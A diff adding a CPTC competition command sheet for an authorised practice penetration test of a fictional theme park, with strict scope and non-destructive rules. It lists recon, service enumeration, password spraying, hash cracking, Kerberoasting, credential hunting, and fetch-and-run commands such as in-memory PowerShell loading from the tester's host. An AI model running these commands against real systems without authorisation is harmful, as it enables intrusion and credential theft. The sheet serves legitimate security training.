@@ -1,0 +1,369 @@
+###############################################################################
+#  CPTC-12 GREAT LAKES - GAME DAY COMMAND SHEET  (team GreatLakes-1)
+#  Client: Butter Family Farms (theme park)   Assessment: Sat 10:00a-6:00p ET
+#  Report due 11:59p Sat - Butter Family Farms branded - PDF + editable Word
+#  Access model: your laptop -> RDP into the VDI -> from the VDI reach
+#    6 Windows (RDP) + 6 Unix (SSH/RDP) targets.  VDI subnet = OUT OF SCOPE.
+###############################################################################
+
+STANDING RULES (live by these):
+  * IN SCOPE ONLY. Out of scope: VDI subnet, VPN, CPTC/host infra, O365,
+    anything that could affect GUEST SAFETY. Out-of-scope tools: LaForge,
+    SplunkUniversalForwarder.
+  * NON-DESTRUCTIVE. Prove, don't exfiltrate (bulk data theft = breach).
+  * CHECK LOCKOUT POLICY before any credential guessing / spray.
+  * ALL assessment data stays in the provided O365/OneDrive. Copilot is the
+    only provided AI - confirm with Ops what data you may paste into it.
+  * Screenshot every success (command + target visible in frame).
+  * ~3:00pm: STOP hunting, START writing. Undocumented = 0 points.
+  * Tie every finding to business impact: guest data, payments, ride/OT
+    systems, investor due-diligence.
+  * Log every artifact you create on a client box; clean it up before 6pm.
+
+LEGEND:  <...> = fill in.   # = comment.   Set vars once, then paste by phase.
+
+===============================================================================
+#  SECTION 1 - LINUX (KALI) BOX
+===============================================================================
+
+### 1.1 CONNECT ###############################################################
+# RDP into the VDI from your laptop:
+xfreerdp /v:<VDI-IP> /u:'<user>' /p:'<pass>' /dynamic-resolution +clipboard
+# (GUI alternative: remmina)
+
+# SSH to a Unix target - direct, or jump through the VDI:
+ssh <user>@<target>
+ssh -p <port> <user>@<target>              # non-default port (check nmap)
+ssh -i key.pem <user>@<target>             # key auth (chmod 600 key.pem first)
+ssh -J <user>@<VDI> <user>@<target>        # ProxyJump through the VDI
+
+# Reusable ~/.ssh/config (type a name instead of the whole hop):
+#   Host vdi
+#       HostName <VDI-IP>
+#       User <user>
+#       ServerAliveInterval 60
+#   Host farm-*
+#       ProxyJump vdi
+#       User <user>
+#   -> then:  ssh farm-web   ssh farm-db   ...
+
+# Pivoting to reach hosts not directly routable:
+ssh -L 8080:<internal-host>:80 <user>@<VDI>    # local fwd -> http://localhost:8080
+ssh -L 13306:<db-host>:3306 <user>@<VDI>       # reach an internal DB locally
+ssh -D 1080 <user>@<VDI>                        # dynamic SOCKS proxy
+#   then add to /etc/proxychains4.conf:  socks5 127.0.0.1 1080
+#   and run tools as:  proxychains4 <tool> ...
+sshuttle -r <user>@<VDI> <subnet>/24            # transparent whole-subnet pivot
+# (chisel / ligolo-ng are the fallbacks when SSH isn't available)
+
+# Fix a changed host key after an env rebuild:
+ssh-keygen -R <target>
+
+### 1.2 SET UP + ENV ##########################################################
+mkdir -p ~/eng/{scans,loot,evidence,web,creds}; cd ~/eng
+# log every command with timestamps (your activity timeline + cleanup record):
+export PROMPT_COMMAND='history -a; echo "$(date "+%F %T") $(history 1)" >> ~/eng/commands.log'
+export SUBNET="10.0.0.0/24"     # <-- your in-scope range
+export IP="10.0.0.5"             # <-- change per target
+export DOMAIN="butters.local"    # <-- the AD domain once known
+
+### 1.3 RECON #################################################################
+# 1) live hosts
+nmap -sn $SUBNET -oA scans/hosts
+grep Up scans/hosts.gnmap | cut -d' ' -f2 > targets.txt
+# 2) all TCP ports (LAUNCH FIRST - slowest). Let it run while you plan.
+nmap -p- --min-rate 2000 -T4 -iL targets.txt -oA scans/fulltcp
+# pull the open ports per host for the version scan:
+grep -oP '\d+/open' scans/fulltcp.gnmap | cut -d/ -f1 | sort -un | paste -sd, -
+# 3) versions + default scripts on the open ports
+nmap -sCV -p<ports> -iL targets.txt -oA scans/services
+# 4) key UDP (SNMP/DNS/TFTP/IPMI/NTP live here)
+nmap -sU --top-ports 100 -T4 -iL targets.txt -oA scans/udp
+# single-host deep dive:
+nmap -sCV -p- -T4 $IP -oA scans/$IP
+# see everything open at a glance:
+grep -h open scans/services.nmap | sort -u
+
+### 1.4 RUN THE SWEEP SCRIPT (non-destructive) ################################
+chmod +x service-sweep.sh
+./service-sweep.sh -t targets.txt           # or:  -g scans/services.gnmap
+# -> results in ./svc-audit/<service>/ ; read svc-audit/summary.txt first.
+
+### 1.5 PER-SERVICE DETAIL (enumerate -> verify, all non-destructive) #########
+
+# --- FTP 21 ---
+nmap -Pn -p21 -sV --script ftp-anon,ftp-syst,ftp-bounce $IP
+ftp $IP          # login: anonymous / <blank or any email>
+#   FINDING: anon access, cleartext creds, writable root. Proof: list + grab 1 file.
+
+# --- SSH 22 ---
+nmap -Pn -p22 -sV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey $IP
+#   FINDING: weak KEX/cipher, password auth + weak creds (lockout-aware), old ver.
+
+# --- TELNET 23 ---
+nmap -Pn -p23 -sV --script telnet-encryption $IP
+#   FINDING: cleartext admin protocol (finding by existence), default creds.
+
+# --- SMTP 25/587 ---
+nmap -Pn -p25,587 -sV --script smtp-commands,smtp-open-relay,smtp-enum-users $IP
+smtp-user-enum -M VRFY -U users.txt -t $IP        # a few names, not a dump
+#   FINDING: open relay (High), VRFY user enum, no TLS.
+
+# --- DNS 53 ---
+dig axfr @$IP $DOMAIN                               # zone transfer = full map
+dig +short version.bind chaos txt @$IP
+nmap -Pn -p53 --script dns-nsid,dns-recursion $IP
+#   FINDING: AXFR (Med-High), open recursion.
+
+# --- POP3/IMAP 110/143/993/995 ---
+nmap -Pn -p110,143,993,995 -sV --script pop3-capabilities,imap-capabilities $IP
+#   FINDING: cleartext mail auth (no STARTTLS).
+
+# --- SMB 139/445 ---
+nxc smb $IP -u '' -p ''                             # null session
+nxc smb $IP -u 'guest' -p '' --shares               # guest + shares
+nxc smb $IP -u '' -p '' --shares
+smbclient -L //$IP/ -N
+smbclient //$IP/<share> -N                          # read one file as proof
+enum4linux-ng -A $IP
+nmap -Pn -p445 --script smb2-security-mode,smb-enum-shares,smb-os-discovery $IP
+nxc smb $IP --gen-relay-list relay.txt              # hosts w/ signing OFF (relay)
+#   FINDING: anon/guest share (High), signing disabled (relay enabler), secrets in shares.
+
+# --- SNMP 161/udp ---
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
+snmpwalk -v2c -c public $IP
+snmp-check $IP -c public
+#   FINDING: default community -> config + sometimes creds (Med-High).
+
+# --- LDAP 389/636 ---
+ldapsearch -x -H ldap://$IP -s base namingContexts
+ldapsearch -x -H ldap://$IP -b "dc=butters,dc=local"
+nxc ldap $IP -u '' -p ''
+#   FINDING: anon bind -> user enum, secrets in description/info fields.
+
+# --- NFS 111/2049 ---
+showmount -e $IP
+sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o ro,nolock $IP:/<export> /mnt/nfs
+#   FINDING: world-readable export (High), no_root_squash (priv-esc path).
+
+# --- rsync 873 ---
+rsync --contimeout=5 --list-only rsync://$IP/
+#   FINDING: anonymous module access.
+
+# --- IPMI 623/udp ---
+nmap -Pn -sU -p623 --script ipmi-cipher-zero,ipmi-version $IP
+#   FINDING: cipher-0 auth bypass / RAKP hash disclosure (High).
+
+# --- VNC 5900 ---
+nmap -Pn -p5900 --script vnc-info,realvnc-auth-bypass $IP
+#   FINDING: no-auth / weak VNC (High).
+
+# --- RDP 3389 ---
+nmap -Pn -p3389 --script rdp-ntlm-info,rdp-enum-encryption $IP
+#   FINDING: NLA disabled, weak/legacy crypto.
+
+# --- WinRM 5985/5986 ---
+evil-winrm -i $IP -u <user> -p <pass>               # with recovered creds = shell
+
+# --- Printers 9100/631, memcached 11211, TFTP 69/udp, X11 6000, finger 79 ---
+nmap -Pn -p9100,631 -sV $IP
+nmap -Pn -p11211 --script memcached-info $IP
+nmap -Pn -sU -p69 --script tftp-enum $IP
+nmap -Pn -p6000 --script x11-access $IP
+nmap -Pn -p79 --script finger $IP
+
+### 1.6 DATABASES (default/blank auth - non-destructive) ######################
+nxc mssql $IP -u sa -p ''
+nmap -Pn -p1433 --script ms-sql-info,ms-sql-ntlm-info $IP
+mysql -h $IP -u root                      # try blank / root / password
+nmap -Pn -p3306 --script mysql-info,mysql-empty-password $IP
+psql  -h $IP -U postgres                  # try blank / postgres
+redis-cli -h $IP INFO server              # unauth Redis
+curl -s http://$IP:9200/_cat/indices?v    # unauth Elasticsearch
+mongosh --host $IP --eval 'db.adminCommand({listDatabases:1})'   # unauth Mongo
+curl -s http://$IP:2375/version           # unauth Docker API (= host root)
+#   PROVE access with ONE record/schema screenshot. NEVER mass-dump (breach).
+
+### 1.7 WEB QUICK-START (deep testing = your methodology.pdf) ##################
+whatweb http://$IP
+curl -sI http://$IP                        # headers (missing sec headers = Low)
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+nikto -h http://$IP
+# Intercept/replay in Burp or Caido. Injection order: login/reset -> search ->
+# id= (IDOR) -> cmd/file/url params -> uploads/fetch -> reflected (XSS/SSTI) ->
+# trusted headers. Save a request to req.txt then:
+sqlmap -r req.txt --batch --level=3 --risk=2 --dbs   # don't aim at lockout endpoints
+
+### 1.8 CREDENTIALS ###########################################################
+# Password spray (ONE password, many users) - CHECK LOCKOUT POLICY FIRST:
+nxc smb $IP -u users.txt -p 'Season2026!' --continue-on-success
+# Offline cracking (safe, do freely):
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt      # NTLM
+hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt      # sha512crypt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt      # AS-REP
+hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt      # Kerberoast
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# LOG every cred in ~/eng/creds/matrix.md the SECOND you get it, and shout it.
+
+### 1.9 FILE TRANSFER #########################################################
+# Serve files from Kali:
+python3 -m http.server 8000           # then pull on target: wget http://<kali>:8000/f
+# On target pull:  curl -O http://<kali>:8000/<file>   |   wget http://<kali>:8000/<file>
+# Push/pull over SSH:
+scp <file> <user>@<ip>:/tmp/ ;  scp <user>@<ip>:/path/<file> .
+# Impacket SMB server (when target speaks SMB):
+impacket-smbserver share $(pwd) -smb2support
+
+### 1.10 ON A UNIX SHELL: PRIV-ESC ENUM (non-destructive) #####################
+id; sudo -l                                 # sudo-able binary? -> GTFOBins it
+find / -perm -4000 -type f 2>/dev/null       # SUID
+find / -perm -2000 -type f 2>/dev/null       # SGID
+getcap -r / 2>/dev/null                       # capabilities (cap_setuid = root)
+cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers    # scheduled jobs
+uname -a; cat /etc/os-release                 # kernel/distro (advisory check)
+ps aux --forest; ss -tulpn                    # services / internal ports
+env; cat ~/.bash_history 2>/dev/null          # creds in env/history
+ls -la /etc/krb5.keytab /home/*/.ssh/ 2>/dev/null
+./linpeas.sh | tee ~/eng/evidence/linpeas-$IP.txt
+# NFS no_root_squash, writable cron/PATH, docker group = classic paths. GTFOBins first.
+# PROOF: screenshot `id` as root. Do NOT install persistence or damage anything.
+
+### 1.11 SHELL UPGRADE + SESSIONS #############################################
+python3 -c 'import pty;pty.spawn("/bin/bash")'    # then Ctrl-Z ; stty raw -echo; fg ; Enter
+tmux new -s eng          # detach Ctrl-b d ; reattach  tmux attach -t eng
+
+===============================================================================
+#  SECTION 2 - WINDOWS (VDI) BOX   (PowerShell unless noted)
+===============================================================================
+
+### 2.1 CONNECT ###############################################################
+# From your laptop:  run  mstsc  -> VDI IP -> creds.
+# From the VDI onward:
+ssh <user>@<unix-target>          # built-in OpenSSH client
+mstsc /v:<windows-target>         # RDP to another Windows host
+#   (or PuTTY: host, port 22, Open)
+
+### 2.2 SITUATIONAL AWARENESS #################################################
+whoami /all                       # user, groups, PRIVILEGES (SeImpersonate?)
+whoami /priv
+systeminfo                        # OS build / hotfixes (patch level)
+hostname
+net user; net localgroup administrators
+net accounts                      # LOCAL password/lockout policy
+qwinsta                           # other logged-on users
+Get-LocalUser; Get-LocalGroupMember Administrators
+
+### 2.3 NETWORK AWARENESS #####################################################
+ipconfig /all
+arp -a                            # neighbors the box knows (lateral targets)
+route print
+netstat -ano                      # listening/established + PIDs
+Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess
+nslookup -type=srv _ldap._tcp.$env:USERDNSDOMAIN   # find DCs
+
+### 2.4 RECON FROM WINDOWS ####################################################
+# If nmap present on the VDI:
+nmap -sCV -p- <target>
+# No nmap - quick checks:
+Test-NetConnection <target> -Port 445
+1..1024 | % { $r=Test-NetConnection <target> -Port $_ -WarningAction SilentlyContinue; if($r.TcpTestSucceeded){"$_ open"} }
+
+### 2.5 SMB / SERVICE CHECKS FROM WINDOWS #####################################
+net view \\<target>                       # list shares
+net use \\<target>\IPC$ "" /u:""          # null session test
+dir \\<target>\<share>
+# (nxc / enum4linux-ng on Kali are easier for SMB/LDAP - prefer those.)
+
+### 2.6 FILE TRANSFER (Windows) ###############################################
+# Pull a tool onto the VDI:
+certutil -urlcache -split -f http://<kali>:8000/<file> <file>
+powershell iwr http://<kali>:8000/<file> -OutFile <file>
+# Load a PS script into memory (tool loading):
+iex (iwr http://<kali>:8000/<script>.ps1 -UseBasicParsing)
+# Copy over SMB:
+copy \\<kali>\share\<file> .
+#   NOTE: Defender may quarantine tooling; keep tools in an excluded C:\Tools.
+#   For AMSI / CLM / logging bypasses, follow your WINDOWS GAMEPLAN (don't paste blind).
+
+### 2.7 AD / DOMAIN ENUMERATION ###############################################
+# Your WINDOWS GAMEPLAN is the authority here - follow it step for step. Kickoffs:
+#   Import-Module ActiveDirectory    (or Tools.zip AD module)
+#   PowerView: Get-Domain; Get-DomainController; Get-DomainUser; Get-DomainComputer;
+#              Get-DomainGroupMember "Domain Admins"; Get-DomainTrust
+#   SharpHound collection -> BloodHound to map paths to DA:
+SharpHound.exe -c All --zip
+#   From Kali instead (often cleaner):
+nxc smb $IP -u <user> -p <pass> --users --groups --shares --pass-pol
+bloodhound-python -u <user> -p <pass> -d $DOMAIN -ns $IP -c all --zip
+#   ADCS check (ESC1-16 - common this season):
+certipy-ad find -u <user>@$DOMAIN -p <pass> -dc-ip $IP -vulnerable -stdout
+#   AS-REP / Kerberoast (crack offline with hashcat modes above):
+nxc ldap $IP -u users.txt -p '' --asreproast asrep.txt
+nxc ldap $IP -u <user> -p <pass> --kerberoasting kerb.txt
+
+### 2.8 WINDOWS LOCAL PRIV-ESC (non-destructive enum) #########################
+whoami /priv                      # SeImpersonate/SeAssignPrimaryToken/SeBackup = exploitable
+.\winPEASx64.exe > winpeas.txt    # broad enum
+.\Seatbelt.exe -group=all         # host triage
+# Unquoted service paths / weak service perms:
+Get-CimInstance Win32_Service | ? {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName
+# Credentials hunting (READ only):
+Get-ChildItem -Recurse -Include *.config,*.xml,*.ini,*.ps1,*.txt -ErrorAction SilentlyContinue |
+  Select-String -Pattern "password","pwd","secret","connectionstring" -ErrorAction SilentlyContinue
+cmdkey /list
+reg query HKLM /f password /t REG_SZ /s 2>$null
+#   For SeImpersonate (Potato) / SeBackup abuse, follow the GAMEPLAN. Proof: whoami as SYSTEM/DA.
+
+### 2.9 PASSWORD SPRAY FROM WINDOWS (CHECK LOCKOUT FIRST) #####################
+net accounts                      # read lockout threshold BEFORE spraying
+#   Then spray from Kali (nxc, see 1.8) staying under the threshold.
+
+===============================================================================
+#  SECTION 3 - OT / RIDE-CONTROL  (theme park - OBSERVE ONLY)
+===============================================================================
+# DO NOT interact with or write to any live safety/ride-control system.
+# OT protocols are often unauthenticated BY DESIGN - a careless write moves real
+# equipment. Your deliverable is architecture + exposure findings, not exploitation.
+# Passive/read-only identify ONLY, and only with Ops' blessing on in-scope,
+# non-safety-critical gear:
+nmap -Pn -p502   --script modbus-discover <IP>     # Modbus
+nmap -Pn -sU -p47808 --script bacnet-info <IP>     # BACnet
+nmap -Pn -p44818 --script enip-info <IP>           # EtherNet/IP
+nmap -Pn -p102   --script s7-info <IP>             # Siemens S7
+# FINDINGS to report: OT on a flat network with IT, exposed OT protocols,
+# HMI/SCADA panels with default/no creds. Frame around GUEST SAFETY + availability.
+
+===============================================================================
+#  SECTION 4 - INJECTS (timed, scored) - quick response skeletons
+===============================================================================
+# Workflow: claim instantly -> note deadline -> answer EXACTLY what's asked ->
+# draft (Copilot assist, then verify + re-brand) -> deliver via O365 on time -> log.
+#
+# STATUS UPDATE:
+#   "Hi [name] - quick update. Confirmed so far: [1-3 findings in plain English
+#    with business impact]. In progress: [areas]. No operational impact on our
+#    side; within scope. Full report by end of day."
+# EXPLAIN-TO-EXEC:
+#   What we found: [1 sentence, no jargon]. Why it matters to the park: [guest
+#   data/payments/operations/reputation]. How bad: [Crit/High/Med]. Fix: [1-2
+#   concrete, achievable actions].
+# TOP-RISK-NOW: one finding, one impact sentence, one immediate action.
+# INCIDENT REPORT: time | source IP | target IP | what happened | scope impact |
+#   root cause | remediation | prevention.  (A good one REDUCES a penalty.)
+# Brand everything Butter Family Farms, ref GreatLakes-1, no school/firm name.
+
+===============================================================================
+#  SECTION 5 - REPORTING + CRED MATRIX
+===============================================================================
+# Every finding: affected host + proof screenshot + business impact + severity
+#   (by business risk, not just CVSS) + realistic remediation + quick fix.
+# Severity DRIVES the report - set it deliberately. Kill ALL TODO/placeholder.
+# Two copies: PDF (scoring) + editable Word. Ref GreatLakes-1. MS Form by 11:59p.
+# Stop testing ~3pm. Submit with a buffer.
+#
+# Keep this live (creds/matrix.md):
+#   | Cred (user:secret/hash) | Source (host/svc) | Works on | Priv | Notes |
+#   |------------------------|-------------------|----------|------|-------|
+###############################################################################
